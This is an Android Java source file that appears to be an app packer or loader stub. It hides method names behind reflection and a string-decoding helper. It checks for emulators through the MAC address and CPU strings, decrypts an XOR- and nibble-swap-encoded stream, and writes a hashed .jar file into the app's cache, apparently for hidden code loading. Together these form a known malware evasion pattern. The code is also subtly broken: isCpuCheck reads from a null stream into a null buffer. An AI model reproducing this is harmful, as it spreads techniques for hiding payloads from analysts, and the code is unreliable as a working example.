package com.dmy;

import android.content.Context;
import android.os.Build;
import android.text.TextUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.NetworkInterface;

public class ClassName0 {

    public static Object invokeMethod(Class<?> clz, String methodName, Object host, Class<?>[] parameterTypes, Object[] args) {
        Object rst = null;
        if (clz != null) {
            Method method = null;
            try {
                method = clz.getMethod(methodName, parameterTypes);
                rst = ClassName1.callMethod(host, method, args);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return rst;
    }

    public static String getMacAddress() {
        try {
            NetworkInterface networkInterface = NetworkInterface.getByName(new ClassName1().decodeStr("wlan0"));
            if (networkInterface == null) {
                return "";
            }
            byte[] data = networkInterface.getHardwareAddress();
            if (data != null) {
                return ClassName2.toHex(data);
            }
        } catch (Exception var3) {
        }
        return "";
    }

    public boolean isCpuCheck() {
        String aa = "";
        String istr = new ClassName1().decodeStr("intel");
        try {
            InputStream is = null;
            StringBuffer sb = null;
            int len = -1;
            while (true) {
                len = (int) ClassName0.invokeMethod(is.getClass(), new ClassName1().decodeStr("msreadms").substring(2, 6), is, (Class<?>[]) null, (Object[]) null);
                if (len == -1) {
                    break;
                }
                sb.append((char) len);
            }
            aa = sb.toString();
            is.close();
        } catch (Exception var7) {
        }
        String aStr = new ClassName1().decodeStr("amd");
        return aa.contains(istr) || aa.contains(aStr);
    }

    public static boolean isMacBad() {
        String macString = ClassName0.getMacAddress();
        if (TextUtils.isEmpty(macString)) {
            return false;
        } else if (new ClassName1().decodeStr("2:0:0:0:0:0").equals(macString)) {
            return true;
        } else {
            return false;
        }
    }

    public void decodeFile(InputStream p0, FileOutputStream p1) throws IOException {
        byte[] encCode = ClassName3.getCodeByte(p0);
        int num = encCode.length;
        int var3 = 0;
        byte[] var4 = new byte[8 * 1024];
        int var5;
        for (; (var5 = p0.read(var4)) > 0; ) {
            int i = 0;
            for (byte tt : var4) {
                if (i < var5) {
                    tt = (byte) ~(tt ^ encCode[var3 % num]);
                    int value_1 = (tt & 0xff) >>> 4;
                    int value_2 = (tt & 0xff) << 4;
                    var4[i] = ClassName2.orOperation(value_1, value_2);
                    i++;
                    var3++;
                }
            }
            p1.write(var4, 0, var5);
        }
    }

    public static File getTargetFile(Context context) {
        String hashCodeMethod = new ClassName1().decodeStr("mhashCodems").substring(1, 9);
        String processName = new ClassName4().getCurrentProcessName();
        String parentPath = "" + processName;
        parentPath = "" + ClassName0.invokeMethod(processName.getClass(), hashCodeMethod, parentPath, (Class<?>[]) null, (Object[]) null);
        String targetPath = (Build.VERSION.SDK_INT + processName);
        targetPath = "" + ClassName0.invokeMethod(processName.getClass(), hashCodeMethod, targetPath, (Class<?>[]) null, (Object[]) null) + new ClassName1().decodeStr(".jar");
        File targetFile = new File(context.getCacheDir(), parentPath + File.separator + targetPath);
        ClassName0.createFile(targetFile);
        return targetFile;
    }

    public static Object invokeNoStaticMethod(Object host, String name, Class<?>[] clsArray, Object... pArray) {
        try {
            if (host == null) {
                return null;
            }
            Method method = host.getClass().getMethod(name, clsArray);
            method.setAccessible(true);
            return method.invoke(host, pArray);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void createFile(File p0) {
        if (!p0.exists()) {
            File parentFile = (File) ClassName0.invokeNoStaticMethod(p0, new ClassName1().decodeStr("msgetParentFilems").substring(2, 15), null);
            ClassName0.invokeNoStaticMethod(parentFile, new ClassName1().decodeStr("mkdirs"), null);
            ClassName0.invokeNoStaticMethod(p0, new ClassName1().decodeStr("createNewFile"), null);
        }
    }
}
